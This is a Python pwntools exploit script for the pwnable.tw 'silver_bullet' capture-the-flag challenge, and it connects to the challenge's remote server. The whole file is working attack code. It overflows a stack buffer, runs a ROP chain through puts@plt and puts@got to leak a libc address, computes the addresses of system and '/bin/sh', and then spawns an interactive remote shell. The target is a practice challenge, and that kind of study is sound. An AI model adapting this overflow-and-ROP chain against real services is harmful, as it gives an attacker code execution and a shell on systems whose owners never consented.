#! /usr/bin/python
from pwn import *

def powerup(data):
	r.sendlineafter('Your choice :','2')
	r.sendlineafter('bullet :',data)

def beat():
	r.sendlineafter('Your choice :','3')

#r = process('./silver_bullet', env={'LD_PRELOAD':'./libc_32.so.6'})
r = remote('chall.pwnable.tw',10103)
#context.log_level = 'debug'
#gdb.attach(r,'b* 0x080488dd')


# ----- stage 1 : leak libc ----- #

### create bullet ###
r.sendlineafter('Your choice :','1')
r.sendlineafter('bullet :','A'*47)

### power up! ###
powerup('A')  # bullet_power -> 1

'''
puts@plt 0x80484a8:	jmp    DWORD PTR ds:0x804afdc

'''
payload = ''
payload += 'A'*7
payload += p32(0x080484a8) # puts@plt
payload += p32(0x08048475) # pop ebx ; ret
payload += p32(0x0804afdc) # puts@got
payload += p32(0x08048954) # return main

powerup(payload)
beat()
beat()

r.recvuntil('Oh ! You win !!\n')
leak = u32(r.recv(4))
libc_base = leak - 389440
success('libc_base = '+hex(libc_base))

system_addr = libc_base + 239936
binsh_addr = libc_base + 1412747

# ----- stage 2 : execute system("/bin/sh") ----- #

### create bullet ###
r.sendlineafter('Your choice :','1')
r.sendlineafter('bullet :','A'*47)

### power up! ###
powerup('A')  # bullet_power -> 1

payload2 = ''
payload2 += 'B'*7
payload2 += p32(system_addr)
payload2 += 'AAAA'
payload2 += p32(binsh_addr)

powerup(payload2)
beat()
beat()

r.interactive()
